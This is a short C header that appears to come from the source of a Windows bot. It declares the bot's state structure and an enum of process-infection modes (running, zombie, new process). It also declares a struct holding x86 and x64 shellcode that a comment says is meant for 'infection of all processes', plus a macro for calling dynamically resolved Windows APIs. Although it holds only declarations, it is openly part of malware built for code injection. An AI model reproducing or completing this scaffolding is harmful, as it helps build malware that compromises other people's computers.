#pragma once
#include "api_structs.h"

typedef struct  
{
	LPWSTR ConfigDirectory;
	LPWSTR ConfigPath;
}dynamic_config_t;

typedef struct  
{
	LPVOID lpShellcode_x86, lpShellcode_x64;
	DWORD dwShellcode_x86_Size, dwShellcode_x64_Size;
}malware_t;

enum process_infection_type
{
	PROCESS_RUNNING_INFECTION = 0,
	PROCESS_ZOMBIE_INFECTION = 1,
	PROCESS_NEW_INFECTION = 2
};

typedef struct
{
	apis_t api;
	modules_t modules;

	crc_t crc;

	wchar_t wzBotPath[255];

	HMODULE hLocal;
	DWORD dwZombiePID;

	dynamic_config_t dynamicconfig;

	unsigned int iProcessInfectionType;

	//Struct containing shellcode for x86 and x64 DLL for infection of all processes
	malware_t malware;

	DWORD dwBaseAddress;
} bot_t;

#define CWA(name) bot.api.p##name
#define CURRENT_PROCESS (HANDLE)-1